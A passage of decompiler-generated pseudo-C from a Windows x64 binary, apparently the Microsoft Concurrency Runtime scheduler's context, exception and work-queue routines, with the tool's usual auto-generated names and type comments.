  *(_BYTE *)(a1 + 295) &= 0xFCu;
  *(_QWORD *)(a1 + 256) = 0i64;
  *(_QWORD *)(a1 + 264) = 0i64;
  *(_QWORD *)(a1 + 272) = 0i64;
  *(_QWORD *)(a1 + 280) = 0i64;
  *(_DWORD *)(a1 + 288) = 0;
  *(_BYTE *)(a1 + 292) = 0;
  *(_BYTE *)(a1 + 294) = 0;
  *(_DWORD *)(a1 + 352) = 0;
  *(_QWORD *)(a1 + 64) = 0i64;
  result = a1;
  *(_BYTE *)(a1 + 368) = 1;
  return result;
}
// 13F18BB80: using guessed type void *Concurrency::IExecutionContext::`vftable';
// 13F18BBB0: using guessed type void *off_13F18BBB0[10];
// 13F18BC00: using guessed type __int64 (__fastcall *off_13F18BC00[18])();

//----- (000000013F155F08) ----------------------------------------------------
_QWORD *__fastcall sub_13F155F08(_QWORD *a1, __int64 a2)
{
  *a1 = &std::exception::`vftable';
  a1[1] = 0i64;
  a1[2] = 0i64;
  sub_13F15E46C(a2 + 8, (__int64)(a1 + 1));
  *a1 = off_13F189E48;
  return a1;
}
// 13F189E48: using guessed type __int64 (__fastcall *off_13F189E48[3])();

//----- (000000013F155F48) ----------------------------------------------------
_QWORD *__fastcall sub_13F155F48(_QWORD *a1, __int64 a2)
{
  *a1 = &std::exception::`vftable';
  a1[1] = 0i64;
  a1[2] = 0i64;
  sub_13F15E46C(a2 + 8, (__int64)(a1 + 1));
  *a1 = off_13F189E30;
  return a1;
}
// 13F189E30: using guessed type __int64 (__fastcall *off_13F189E30[3])();

//----- (000000013F155F88) ----------------------------------------------------
_QWORD *__fastcall sub_13F155F88(_QWORD *a1, __int64 a2)
{
  *a1 = &std::exception::`vftable';
  a1[1] = 0i64;
  a1[2] = 0i64;
  sub_13F15E46C(a2 + 8, (__int64)(a1 + 1));
  *a1 = off_13F189ED8;
  return a1;
}
// 13F189ED8: using guessed type __int64 (__fastcall *off_13F189ED8[2])();

//----- (000000013F155FC8) ----------------------------------------------------
_QWORD *__fastcall sub_13F155FC8(_QWORD *a1, __int64 a2)
{
  *a1 = &std::exception::`vftable';
  a1[1] = 0i64;
  a1[2] = 0i64;
  sub_13F15E46C(a2 + 8, (__int64)(a1 + 1));
  *a1 = off_13F189EC0;
  return a1;
}
// 13F189EC0: using guessed type __int64 (__fastcall *off_13F189EC0[3])();

//----- (000000013F156008) ----------------------------------------------------
void **__fastcall sub_13F156008(_QWORD *a1, __int64 a2)
{
  _QWORD *v2; // rbx
  __int64 v3; // rdx

  *a1 = off_13F18BBB0;
  v2 = a1 + 2;
  a1[2] = off_13F18BC00;
  sub_13F1565B0((__int64)a1, a2);
  return sub_13F14DE6C((__int64)v2, v3);
}
// 13F15603D: variable 'v3' is possibly undefined
// 13F18BBB0: using guessed type void *off_13F18BBB0[10];
// 13F18BC00: using guessed type __int64 (__fastcall *off_13F18BC00[18])();

//----- (000000013F156044) ----------------------------------------------------
__int64 sub_13F156044()
{
  return sub_13F1024C0();
}
// 13F156044: using guessed type __int64 __fastcall sub_13F156044();

//----- (000000013F156060) ----------------------------------------------------
_QWORD *__fastcall sub_13F156060(__int64 a1, __int64 a2)
{
  return sub_13F15606C((_QWORD *)(a1 - 16), a2);
}

//----- (000000013F15606C) ----------------------------------------------------
_QWORD *__fastcall sub_13F15606C(_QWORD *a1, __int64 a2)
{
  char v2; // bl

  v2 = a2;
  sub_13F156008(a1, a2);
  if ( (v2 & 1) != 0 )
    sub_13F14088C(a1, 384i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F1560A0) ----------------------------------------------------
char __fastcall sub_13F1560A0(__int64 a1, __int64 a2)
{
  __int64 v4; // rsi
  __int64 *v5; // r9
  __int64 v6; // rcx
  __int64 (__fastcall *v7)(__int64 *, __int64, int *); // rax
  char result; // al
  __int64 v9; // r8
  int v10; // eax
  __int64 v11; // r15
  __int64 v12; // rbx
  __int64 v13; // r9
  __int64 v14; // rdx
  __int64 v15; // rcx
  int v16; // er8
  int v17; // ecx
  __int64 v18; // rax
  __int64 v19; // rcx
  __int64 v20; // rbx
  _QWORD *v21; // rcx
  int v22[2]; // [rsp+28h] [rbp-29h] BYREF
  __int64 v23; // [rsp+30h] [rbp-21h]
  __int64 v24; // [rsp+38h] [rbp-19h]
  int v25[2]; // [rsp+40h] [rbp-11h] BYREF
  __int64 v26; // [rsp+48h] [rbp-9h]
  __int64 v27; // [rsp+50h] [rbp-1h]
  int v28[2]; // [rsp+58h] [rbp+7h] BYREF
  __int64 v29; // [rsp+60h] [rbp+Fh]
  __int64 v30; // [rsp+68h] [rbp+17h]
  int v31; // [rsp+70h] [rbp+1Fh]
  int v32; // [rsp+74h] [rbp+23h]
  __int64 v33; // [rsp+78h] [rbp+27h]
  __int64 v34; // [rsp+80h] [rbp+2Fh]
  __int64 v35; // [rsp+88h] [rbp+37h] BYREF
  int v36; // [rsp+90h] [rbp+3Fh]

  v4 = sub_13F1492D4();
  if ( *(int *)(*(_QWORD *)(a1 + 72) + 680i64) > 0 )
  {
    v5 = *(__int64 **)(a1 + 72);
    v6 = *v5;
    v22[0] = *(_DWORD *)a2;
    v23 = *(_QWORD *)(a2 + 8);
    v7 = *(__int64 (__fastcall **)(__int64 *, __int64, int *))(v6 + 120);
    v22[1] = *(_DWORD *)(a2 + 4);
    v24 = *(_QWORD *)(a2 + 16);
    result = v7(v5, a1, v22);
    if ( result )
      return result;
  }
  if ( !v4 || *(_BYTE *)(v4 + 136) || *(_QWORD *)(a1 + 72) != sub_13F102FE0(v4) )
  {
LABEL_20:
    v21 = *(_QWORD **)(a1 + 64);
    v28[0] = *(_DWORD *)a2;
    v29 = *(_QWORD *)(a2 + 8);
    v28[1] = *(_DWORD *)(a2 + 4);
    v30 = *(_QWORD *)(a2 + 16);
    return sub_13F158884(v21, a1, (__int64)v28);
  }
  sub_13F1024C0();
  v9 = *(_QWORD *)(a1 + 64);
  if ( (*(_BYTE *)(*(_QWORD *)(v9 + 424) + 80i64) & 2) != 0
    || (v10 = *(_DWORD *)(*(_QWORD *)(v9 + 56)
                        + 4 * ((unsigned __int64)*(unsigned int *)(*(_QWORD *)(v4 + 248) + 212i64) >> 5)),
        !_bittest(&v10, *(_DWORD *)(*(_QWORD *)(v4 + 248) + 212i64) & 0x1F))
    || *(_DWORD *)(*(_QWORD *)(v4 + 248) + 28i64) - *(_DWORD *)(*(_QWORD *)(v4 + 248) + 24i64) >= *(unsigned __int16 *)(*(_QWORD *)(a1 + 72) + 24i64) )
  {
    sub_13F1024C0();
    goto LABEL_20;
  }
  v11 = *(_QWORD *)(a1 + 64);
  v12 = *(_QWORD *)(v11 + 424);
  if ( sub_13F14E9A4(v4) != v12 )
    *(_DWORD *)(a1 + 352) = 1;
  v13 = *(_QWORD *)(v4 + 248);
  v14 = *(int *)(v13 + 28);
  v15 = *(int *)(v13 + 32);
  if ( (int)v14 >= (int)v15 + *(_DWORD *)(v13 + 24) )
  {
    v35 = 0i64;
    v36 = 0;
    sub_13F156B08((int *)(v13 + 24), a1, (__int64)&v35);
  }
  else
  {
    *(_QWORD *)(*(_QWORD *)(v13 + 40) + 8 * (v14 & v15)) = a1;
    *(_DWORD *)(v13 + 28) = v14 + 1;
  }
  if ( *(int *)(*(_QWORD *)(a1 + 72) + 676i64) > 0 )
  {
    v16 = *(_DWORD *)a2;
    v17 = *(_DWORD *)(a2 + 4);
    v18 = *(_QWORD *)(a2 + 16);
    v33 = *(_QWORD *)(a2 + 8);
    v26 = v33;
    v31 = v16;
    v32 = v17;
    v25[0] = v16;
    v25[1] = v17;
    v19 = *(_QWORD *)(a1 + 72);
    v34 = v18;
    v27 = v18;
    sub_13F14BD04(v19, v11, (__int64)v25, 11);
  }
  v20 = *(_QWORD *)(v11 + 424);
  if ( sub_13F14E9A4(v4) != v20 )
    *(_DWORD *)(a1 + 352) = 0;
  return sub_13F1024C0();
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F1562DC) ----------------------------------------------------
__int64 *__fastcall sub_13F1562DC(__int64 a1, __int64 a2)
{
  __int64 v4; // rax
  __int64 *v5; // rbx

  sub_13F1024C0();
  v4 = sub_13F154798(*(_QWORD *)(a1 + 248));
  v5 = sub_13F155CE4(v4, a2);
  sub_13F1024C0();
  return v5;
}

//----- (000000013F15634C) ----------------------------------------------------
__int64 __fastcall sub_13F15634C(__int64 a1)
{
  int v2; // ebx
  char v3; // cl
  signed __int32 v4; // eax
  __int64 v5; // rsi
  __int64 v6; // rcx
  __int64 v7; // rax
  __int64 v8; // rbx
  void (__fastcall *v9)(__int64, int *); // rbx
  __int64 v10; // rax
  int v12[2]; // [rsp+20h] [rbp-20h] BYREF
  __int64 v13; // [rsp+28h] [rbp-18h]
  __int64 v14; // [rsp+30h] [rbp-10h]
  bool v15; // [rsp+70h] [rbp+30h] BYREF
  bool v16; // [rsp+78h] [rbp+38h] BYREF

  sub_13F1024C0();
  (*(void (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 56) + 8i64))(*(_QWORD *)(a1 + 56));
  v2 = 1;
  v3 = *(_BYTE *)(*(_QWORD *)(a1 + 248) + 257i64);
  v4 = _InterlockedIncrement((volatile signed __int32 *)(a1 + 84));
  if ( v3 )
  {
    if ( v4 != 1 || _InterlockedCompareExchange((volatile signed __int32 *)(a1 + 84), 2, 1) != 1 )
      v2 = 2;
    sub_13F157284(a1 - 16, v2);
  }
  else if ( v4 == 1 )
  {
    v15 = 0;
    v16 = 0;
    v5 = sub_13F1568B0((_QWORD *)(a1 - 16), &v15, &v16);
    if ( _InterlockedCompareExchange((volatile signed __int32 *)(a1 + 84), 2, 1) == 1 )
    {
      if ( v15 )
      {
        v6 = *(_QWORD *)(a1 + 48);
        *(_BYTE *)(v5 + 368) = 0;
        *(_QWORD *)(v5 + 64) = v6;
        v7 = *(_QWORD *)(v6 + 424);
        if ( (*(_BYTE *)(v7 + 80) & 4) == 0 )
          _InterlockedAdd((volatile signed __int32 *)(v7 + 40), 1u);
      }
      sub_13F157404(a1 - 16, v5, 1);
    }
    else if ( v5 )
    {
      if ( v15 )
      {
        sub_13F14B404(*(_QWORD *)(a1 + 56), v5, 1);
      }
      else
      {
        if ( v16 )
        {
          v8 = *(_QWORD *)(v5 + 280);
          sub_13F1024C0();
          sub_13F15B06C(v8, v5 + 16);
          sub_13F1024C0();
        }
        v9 = *(void (__fastcall **)(__int64, int *))(*(_QWORD *)v5 + 40i64);
        v10 = sub_13F102FD0(v5 + 16);
        v12[0] ^= (v12[0] ^ *(_DWORD *)(v10 + 24)) & 0xFFFFFFF;
        v12[0] = *(_DWORD *)(v10 + 24) ^ (v12[0] ^ *(_DWORD *)(v10 + 24)) & 0xFFFFFFF;
        v13 = *(_QWORD *)(v10 + 32);
        v12[1] = *(_DWORD *)(v10 + 28);
        v14 = *(_QWORD *)(v10 + 40);
        v9(v5, v12);
      }
    }
  }
  return sub_13F1024C0();
}
// 13F1563A2: conditional instruction was optimized away because cl.1==0
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C5EB8: using guessed type int dword_13F1C5EB8;
// 13F1C5EBC: using guessed type char byte_13F1C5EBC;

//----- (000000013F15651C) ----------------------------------------------------
char __fastcall sub_13F15651C(__int64 a1)
{
  __int64 v2; // rax
  __int64 v3; // rbx
  __int64 v4; // rdx
  unsigned int v6; // [rsp+20h] [rbp-18h] BYREF
  __int64 v7; // [rsp+28h] [rbp-10h]

  if ( *(_QWORD *)(a1 + 264) )
  {
    v6 = 0;
    *(_BYTE *)(a1 + 292) = 1;
    LOBYTE(v2) = sub_13F1545CC(*(_QWORD *)(a1 + 264), (__int64)&v6, 15, 1);
    if ( (_BYTE)v2 )
      LOBYTE(v2) = sub_13F154694(v7, v6, 0i64, 0i64);
  }
  else
  {
    v3 = a1 + 16;
    v2 = sub_13F1492D4();
    if ( v2 == v3 )
    {
      *(_BYTE *)(a1 + 292) = 1;
    }
    else
    {
      sub_13F157088(a1);
      sub_13F1565B0(a1, v4);
      LOBYTE(v2) = sub_13F149148(*(_QWORD *)(a1 + 72));
    }
  }
  return v2;
}
// 13F156597: variable 'v4' is possibly undefined

//----- (000000013F1565B0) ----------------------------------------------------
void __fastcall sub_13F1565B0(__int64 a1, __int64 a2)
{
  sub_13F14E47C(a1 + 16, a2);
  sub_13F1571C4(a1, 0i64, 0);
}

//----- (000000013F1565D4) ----------------------------------------------------
__int64 __fastcall sub_13F1565D4(__int64 a1)
{
  __int64 v2; // rdx

  sub_13F1024C0();
  sub_13F1565B0(a1, v2);
  return sub_13F149148(*(_QWORD *)(a1 + 72));
}
// 13F1565E9: variable 'v2' is possibly undefined

//----- (000000013F1565FC) ----------------------------------------------------
__int64 __fastcall sub_13F1565FC(__int64 a1)
{
  _QWORD *v2; // rax
  bool v3; // r14
  char v4; // di
  __int64 v5; // r8
  __int64 v6; // r9
  int v8[4]; // [rsp+28h] [rbp-38h] BYREF
  __int64 v9; // [rsp+38h] [rbp-28h]
  __int64 pExceptionObject[4]; // [rsp+40h] [rbp-20h] BYREF
  __int64 v11; // [rsp+90h] [rbp+30h] BYREF

  *(_DWORD *)(a1 + 144) = MEMORY[0x76F83380](a1);
  sub_13F14EF20();
  v2 = (_QWORD *)(*(__int64 (__fastcall **)(_QWORD, __int64 *))(**(_QWORD **)(a1 + 72) + 24i64))(
                   *(_QWORD *)(a1 + 72),
                   &v11);
  v3 = !(unsigned int)sub_13F150BEC(v2, 9u) && (unsigned int)sub_13F1454C0() == 6;
  sub_13F150BB8(&v11);
  if ( v3 )
    sub_13F1537EC(1u);
  sub_13F1024C0();
  *(_DWORD *)(a1 + 288) = 0;
  v4 = 0;
  if ( !sub_13F156820(a1) || (v4 = sub_13F156CD4(a1)) == 0 )
  {
    do
    {
      v8[0] = 0;
      v9 = 0i64;
      *(_BYTE *)(a1 + 295) &= ~2u;
      if ( !*(_QWORD *)(a1 + 264) )
      {
        sub_13F1024C0();
        sub_13F142E28(pExceptionObject);
        CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVnested_scheduler_missing_detach_Concurrency__);
      }
      if ( !*(_BYTE *)(a1 + 294) && sub_13F155054(*(_QWORD *)(a1 + 264)) )
      {
        sub_13F1024C0();
        sub_13F148DD0(*(_QWORD *)(a1 + 72));
        sub_13F1024C0();
      }
      if ( sub_13F157868(a1, (__int64)v8, v5, v6) )
      {
        if ( v8[0] == 1 )
        {
          sub_13F157404(a1, v9, 0);
LABEL_20:
          v4 = 1;
          continue;
        }
        sub_13F1567C8(a1, (__int64)v8);
        v4 = sub_13F156CD4(a1);
      }
      else
      {
        if ( sub_13F156CD4(a1) )
          goto LABEL_20;
        sub_13F157714(a1);
        if ( *(_BYTE *)(a1 + 292) )
        {
          sub_13F1565D4(a1);
          goto LABEL_20;
        }
      }
    }
    while ( !v4 );
  }
  if ( v3 )
    sub_13F153810();
  return sub_13F14E5A0();
}
// 13F15671B: variable 'v5' is possibly undefined
// 13F15671B: variable 'v6' is possibly undefined
// 13F1454C0: using guessed type __int64 sub_13F1454C0(void);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1565FC: using guessed type _QWORD pExceptionObject[4];

//----- (000000013F1567C8) ----------------------------------------------------
void __fastcall sub_13F1567C8(__int64 a1, __int64 a2)
{
  __int64 v4; // rdx

  sub_13F15DD44(a2, a1);
  ++*(_DWORD *)(*(_QWORD *)(a1 + 264) + 164i64);
  sub_13F1024C0();
  sub_13F15C5E0(a2);
  sub_13F1024C0();
  sub_13F14EC9C(a1 + 16, v4);
}
// 13F156819: variable 'v4' is possibly undefined

//----- (000000013F156820) ----------------------------------------------------
char __fastcall sub_13F156820(__int64 a1)
{
  __int64 v2; // rdi
  __int64 v3; // rsi
  __int64 v4; // rcx
  __int64 v5; // rdx

  if ( !*(_QWORD *)(a1 + 280) )
    return 0;
  v2 = a1 + 16;
  sub_13F1024C0();
  v3 = *(_QWORD *)(a1 + 280);
  if ( *(_BYTE *)(a1 + 293) )
  {
    (*(void (__fastcall **)(__int64))(v3 + 24))(v3);
    *(_QWORD *)(a1 + 280) = 0i64;
  }
  else
  {
    sub_13F15DDD4(v3);
    v4 = *(_QWORD *)(a1 + 72);
    *(_QWORD *)(a1 + 280) = 0i64;
    sub_13F14B450(v4, (__int64 (__fastcall ***)(_QWORD, __int64))v3);
  }
  sub_13F1024C0();
  sub_13F14EC9C(v2, v5);
  return 1;
}
// 13F156893: variable 'v5' is possibly undefined
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F1568B0) ----------------------------------------------------
__int64 __fastcall sub_13F1568B0(_QWORD *a1, bool *a2, bool *a3)
{
  __int64 v4; // rcx
  __int64 v7; // rdi
  __int64 v8; // rdx
  int v10[4]; // [rsp+30h] [rbp-20h] BYREF
  __int64 v11; // [rsp+40h] [rbp-10h]

  v10[0] = 0;
  v4 = a1[33];
  v11 = 0i64;
  if ( !(*(unsigned __int8 (__fastcall **)(__int64, int *, _QWORD, _QWORD, int))(v4 + 104))(
          v4 + 64,
          v10,
          a1[8],
          0i64,
          25) )
  {
    v7 = sub_13F149D3C(a1[9], 1);
    *a2 = v7 != 0;
    return v7;
  }
  if ( v10[0] == 1 )
    return v11;
  sub_13F1024C0();
  v7 = sub_13F149D3C(a1[9], 1);
  sub_13F1024C0();
  if ( !v7 )
  {
    if ( !(*(unsigned __int8 (__fastcall **)(__int64, int *, _QWORD, _QWORD, int))(a1[33] + 104i64))(
            a1[33] + 64i64,
            v10,
            a1[8],
            0i64,
            1) )
      return v7;
    return sub_13F15C01C((__int64)v10);
  }
  if ( !sub_13F15C81C((__int64)v10) )
  {
    if ( !(*(unsigned __int8 (__fastcall **)(__int64, int *, _QWORD, _QWORD, int))(a1[33] + 104i64))(
            a1[33] + 64i64,
            v10,
            a1[8],
            0i64,
            7) )
    {
      *a2 = 1;
      return v7;
    }
    v8 = v7;
    if ( v10[0] != 1 )
    {
      *a3 = v10[0] == 4;
      goto LABEL_9;
    }
    sub_13F14B404(a1[9], v7, 1);
    return sub_13F15C01C((__int64)v10);
  }
  v8 = v7;
  *a3 = v10[0] == 4;
LABEL_9:
  sub_13F15C078((__int64)v10, v8);
  return v7;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F156A30) ----------------------------------------------------
__int64 __fastcall sub_13F156A30(__int64 a1, __int64 a2)
{
  __int64 v4; // rax

  sub_13F1024C0();
  v4 = sub_13F154798(*(_QWORD *)(a1 + 248));
  sub_13F155D88(v4, a2);
  return sub_13F1024C0();
}

//----- (000000013F156A70) ----------------------------------------------------
signed __int64 __fastcall sub_13F156A70(__int64 a1, signed __int64 a2)
{
  __int64 v2; // r9

  v2 = 0i64;
  if ( a2
    && a2 == *(_QWORD *)(a1 + 272)
    && a2 == _InterlockedCompareExchange64((volatile signed __int64 *)(a1 + 272), 0i64, a2) )
  {
    return a2;
  }
  return v2;
}

//----- (000000013F156A98) ----------------------------------------------------
__int64 __fastcall sub_13F156A98(__int64 a1)
{
  return *(unsigned int *)(a1 - 16 + 48);
}

//----- (000000013F156AA4) ----------------------------------------------------
__int64 __fastcall sub_13F156AA4(__int64 a1)
{
  return *(_QWORD *)(a1 + 256);
}

//----- (000000013F156AAC) ----------------------------------------------------
__int64 __fastcall sub_13F156AAC(__int64 a1)
{
  return (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 72) + 104i64))(*(_QWORD *)(a1 + 72));
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F156AC0) ----------------------------------------------------
__int64 __fastcall sub_13F156AC0(__int64 a1)
{
  unsigned int v2; // edi

  sub_13F1024C0();
  if ( *(_QWORD *)(a1 + 248) )
    v2 = *(_DWORD *)(*(_QWORD *)(a1 + 248) + 204i64);
  else
    v2 = -1;
  sub_13F1024C0();
  return v2;
}

//----- (000000013F156B08) ----------------------------------------------------
__int64 __fastcall sub_13F156B08(int *a1, __int64 a2, __int64 a3)
{
  __int64 v5; // rbx
  unsigned __int128 v6; // rax
  __int64 v7; // r13
  unsigned __int128 v8; // rax
  __int64 v9; // rax
  __int64 v10; // rsi
  __int64 v11; // rcx
  __int64 v12; // r12
  volatile __int32 *v13; // rbx
  int v14; // er10
  int v15; // er14
  __int64 v16; // r8
  __int64 v17; // r9
  unsigned __int64 v18; // rcx
  int v19; // eax
  unsigned __int64 v20; // rcx
  __int64 v21; // rdx
  __int64 v22; // rdx
  int v24; // [rsp+80h] [rbp+8h]
  __int64 v25; // [rsp+88h] [rbp+10h]

  v24 = 2 * a1[2] + 2;
  v5 = v24;
  v6 = (unsigned __int64)v24 * (unsigned __int128)8ui64;
  if ( !is_mul_ok(v24, 8ui64) )
    *(_QWORD *)&v6 = -1i64;
  v7 = sub_13F1790C4(v6, *((_QWORD *)&v6 + 1));
  v25 = *((_QWORD *)a1 + 2);
  v8 = (unsigned __int64)v24 * (unsigned __int128)0x10u;
  if ( !is_mul_ok(v24, 0x10ui64) )
    *(_QWORD *)&v8 = -1i64;
  v9 = sub_13F1790C4(v8, *((_QWORD *)&v8 + 1));
  v10 = v9;
  if ( v9 )
  {
    v11 = v9;
    if ( v24 )
    {
      do
      {
        *(_QWORD *)v11 = 0i64;
        *(_DWORD *)(v11 + 8) = 0;
        v11 += 16i64;
        --v5;
      }
      while ( v5 );
    }
  }
  else
  {
    v10 = 0i64;
  }
  v12 = *((_QWORD *)a1 + 3);
  v13 = (volatile __int32 *)*((_QWORD *)a1 + 4);
  sub_13F142BD8(v13);
  v14 = *a1;
  v15 = a1[1] - *a1;
  if ( v15 > 0 )
  {
    v16 = 0i64;
    v17 = v10;
    do
    {
      *(_QWORD *)(v7 + 8 * v16) = *(_QWORD *)(*((_QWORD *)a1 + 2) + 8 * (v14 & (unsigned __int64)a1[2]));
      v18 = *((_QWORD *)a1 + 3) + 16 * (v14 & (unsigned __int64)a1[2]);
      *(_QWORD *)v17 = *(_QWORD *)v18;
      *(_DWORD *)(v17 + 8) = *(_DWORD *)(v18 + 8);
      ++v14;
      ++v16;
      v17 += 16i64;
    }
    while ( v16 < v15 );
  }
  sub_13F15EF70(v7 + 8i64 * v15, 0, 8i64 * (v24 - v15));
  *((_QWORD *)a1 + 2) = v7;
  *((_QWORD *)a1 + 3) = v10;
  *a1 = 0;
  v19 = v24 - 1;
  a1[2] = v24 - 1;
  if ( *(_QWORD *)a3 )
  {
    v20 = *((_QWORD *)a1 + 3) + 16 * (v15 & (unsigned __int64)v19);
    *(_QWORD *)v20 = *(_QWORD *)a3;
    *(_DWORD *)(v20 + 8) = *(_DWORD *)(a3 + 8);
    a2 |= 1ui64;
    v19 = a1[2];
  }
  *(_QWORD *)(*((_QWORD *)a1 + 2) + 8 * (v15 & (unsigned __int64)v19)) = a2;
  a1[1] = v15 + 1;
  sub_13F142C20(v13);
  sub_13F14088C(v25, v21);
  return sub_13F14088C(v12, v22);
}
// 13F156CAB: variable 'v21' is possibly undefined
// 13F156CC3: variable 'v22' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F1790C4: using guessed type __int64 __fastcall sub_13F1790C4(_QWORD, _QWORD);

//----- (000000013F156CC8) ----------------------------------------------------
bool __fastcall sub_13F156CC8(__int64 a1)
{
  return *(_DWORD *)(a1 + 84) == 2;
}

//----- (000000013F156CD4) ----------------------------------------------------
char __fastcall sub_13F156CD4(__int64 a1)
{
  if ( *(_BYTE *)(a1 + 294) || !*(_BYTE *)(*(_QWORD *)(a1 + 264) + 257i64) )
    return 0;
  if ( *(_DWORD *)(a1 + 288) )
    sub_13F154A10(*(_QWORD *)(a1 + 72) + 96i64, *(_DWORD *)(*(_QWORD *)(a1 + 264) + 212i64));
  *(_DWORD *)(a1 + 288) = 0;
  if ( sub_13F157284(a1, 0) )
    sub_13F1565D4(a1);
  return 1;
}

//----- (000000013F156D44) ----------------------------------------------------
__int64 __fastcall sub_13F156D44(__int64 a1)
{
  __int64 v2; // rax
  __int64 v3; // rsi
  __int64 v4; // rcx
  __int64 v5; // rax
  __int64 v6; // r8
  __int64 v7; // r14
  __int64 v8; // rbp
  __int64 v9; // r12
  __int64 v10; // r15
  bool v12; // [rsp+50h] [rbp+8h] BYREF
  bool v13; // [rsp+58h] [rbp+10h] BYREF

  sub_13F1024C0();
  v12 = 0;
  v13 = 0;
  v2 = sub_13F1568B0((_QWORD *)a1, &v12, &v13);
  v3 = v2;
  if ( v12 )
  {
    v4 = *(_QWORD *)(a1 + 64);
    *(_BYTE *)(v2 + 368) = 0;
    *(_QWORD *)(v2 + 64) = v4;
    v5 = *(_QWORD *)(v4 + 424);
    if ( (*(_BYTE *)(v5 + 80) & 4) == 0 )
      _InterlockedIncrement((volatile signed __int32 *)(v5 + 40));
  }
  sub_13F1024C0();
  v7 = *(_QWORD *)(a1 + 264);
  v8 = v3;
  v9 = *(_QWORD *)(a1 + 72);
  *(_QWORD *)(a1 + 264) = 0i64;
  v10 = *(_QWORD *)(a1 + 256);
  if ( !v3 )
    v8 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v7 + 8i64))(v7);
  (*(void (__fastcall **)(__int64, __int64, __int64, _QWORD))(*(_QWORD *)v7 + 32i64))(
    v7,
    v3,
    v6,
    (unsigned int)_InterlockedExchange((volatile __int32 *)(a1 + 96), 1));
  if ( v8 )
  {
    (*(void (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)v10 + 8i64))(v10, v8, 2i64);
  }
  else
  {
    sub_13F154B48(v7, 4, 1);
    sub_13F149168(v9);
    (*(void (__fastcall **)(__int64, __int64))(*(_QWORD *)v10 + 16i64))(v10, 2i64);
  }
  sub_13F1024C0();
  return sub_13F1024C0();
}
// 13F156E06: variable 'v6' is possibly undefined
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F156E7C) ----------------------------------------------------
char __fastcall sub_13F156E7C(__int64 a1, char a2)
{
  int v2; // eax
  signed __int64 v4; // rax
  _BYTE *v5; // rcx
  __int64 pExceptionObject[5]; // [rsp+20h] [rbp-28h] BYREF

  v2 = *(_DWORD *)(a1 + 44);
  if ( a2 )
  {
    LODWORD(v4) = v2 + 1;
    *(_DWORD *)(a1 + 44) = v4;
    if ( (_DWORD)v4 == 1 )
    {
      sub_13F1024C0();
      (*(void (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 248) + 64i64))(*(_QWORD *)(a1 + 248));
      LOBYTE(v4) = sub_13F1024C0();
    }
  }
  else
  {
    if ( !v2 )
    {
      sub_13F142D48(pExceptionObject);
      CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVinvalid_oversubscribe_operation_Concurrency__);
    }
    LODWORD(v4) = v2 - 1;
    *(_DWORD *)(a1 + 44) = v4;
    if ( !(_DWORD)v4 )
    {
      v5 = *(_BYTE **)(a1 + 256);
      if ( v5 )
      {
        v4 = *(_QWORD *)(a1 + 256);
        if ( v5 == (_BYTE *)v4 )
        {
          v4 = _InterlockedCompareExchange64((volatile signed __int64 *)(a1 + 256), 0i64, (signed __int64)v5);
          if ( v5 == (_BYTE *)v4 )
            LOBYTE(v4) = sub_13F154BC8(v5);
        }
      }
    }
  }
  return v4;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F156E7C: using guessed type _QWORD pExceptionObject[5];

//----- (000000013F156F18) ----------------------------------------------------
void __fastcall sub_13F156F18(__int64 a1, __int64 a2, __int64 a3, char a4)
{
  __int64 v4; // rcx
  __int64 v5; // rdx
  char v6; // al

  *(_BYTE *)(a1 + 368) = 0;
  *(_QWORD *)(a1 + 64) = a2;
  if ( a3 )
  {
    if ( a4 )
    {
      v5 = *(_QWORD *)(a2 + 424);
      v6 = 1;
      if ( (*(_BYTE *)(v5 + 80) & 4) == 0 )
        _InterlockedAdd((volatile signed __int32 *)(v5 + 40), 1u);
    }
    else
    {
      v6 = 0;
    }
    *(_BYTE *)(a1 + 293) = v6;
    *(_QWORD *)(a1 + 280) = a3;
  }
  else
  {
    v4 = *(_QWORD *)(a2 + 424);
    if ( (*(_BYTE *)(v4 + 80) & 4) == 0 )
      _InterlockedAdd((volatile signed __int32 *)(v4 + 40), 1u);
  }
}

//----- (000000013F156F6C) ----------------------------------------------------
__int64 __fastcall sub_13F156F6C(__int64 a1, __int64 a2)
{
  *(_QWORD *)(a1 + 264) = a2;
  return (unsigned int)_InterlockedExchange((volatile __int32 *)(a1 + 96), 0);
}

//----- (000000013F156F7C) ----------------------------------------------------
void __fastcall sub_13F156F7C(__int64 a1)
{
  __int64 v2; // rcx
  int v3[6]; // [rsp+20h] [rbp-18h] BYREF

  if ( *(_BYTE *)(a1 + 294) )
  {
    v2 = *(_QWORD *)(a1 + 264);
    v3[0] = 0;
    if ( !sub_13F1545CC(v2, (__int64)v3, 15, 1) )
    {
      while ( !(unsigned __int8)sub_13F154664(*(_QWORD *)(a1 + 264)) )
        (*(void (__fastcall **)(__int64))(*(_QWORD *)a1 + 64i64))(a1);
    }
    *(_BYTE *)(a1 + 294) = 0;
  }
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F156F7C: using guessed type int var_18[6];

//----- (000000013F156FE4) ----------------------------------------------------
__int64 __fastcall sub_13F156FE4(__int64 a1)
{
  sub_13F1024C0();
  sub_13F157284(a1, 3);
  return sub_13F1024C0();
}
